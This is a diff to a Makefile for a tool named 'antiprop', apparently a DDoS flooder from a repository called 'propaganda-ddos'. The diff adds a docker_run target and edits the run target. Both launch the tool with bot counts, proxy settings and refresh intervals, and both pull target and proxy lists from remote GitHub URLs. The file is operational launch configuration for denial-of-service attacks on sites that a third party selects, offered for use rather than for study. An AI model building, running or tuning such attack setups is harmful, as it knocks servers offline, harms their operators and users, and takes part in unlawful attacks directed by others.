@@ -4,6 +4,12 @@ build:
 docker_build:
 	docker build -t antiprop .
 
+docker_run:
+	docker run --rm -it --name=antiprop lovefromukraine/antiprop --refresh=69 \
+	--dnsres=true --errcount=69 --onlyproxy=false --bots 4 --checkproxy=true \
+	https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/targets.json \
+	https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/proxy.json
+
 docker_push:
 	docker build -t antiprop .
 	docker tag antiprop:latest lovefromukraine/antiprop:latest
@@ -19,9 +25,9 @@ test_nc:
 	while :; do nc -l -p 8080 | tee  output.log; sleep 1; done
 
 run:
-	./antiprop --onlyproxy=false --bots 3 --refresh=30 --checkproxy=false --dnsres=true \
-		--sites https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/targets.json \
-		--proxy ttps://raw.githubusercontent.com/meddion/propaganda-ddos/sources/proxy.json
+	./antiprop --refresh=20 --dnsres=true --errcount=5 --onlyproxy=false --bots 2 --checkproxy=false \
+	--sites https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/targets.json \
+	--proxy https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/proxy.json
 
 run_file:
 	./antiprop --checkproxy=false --onlyproxy --api 2 --bots 3 \
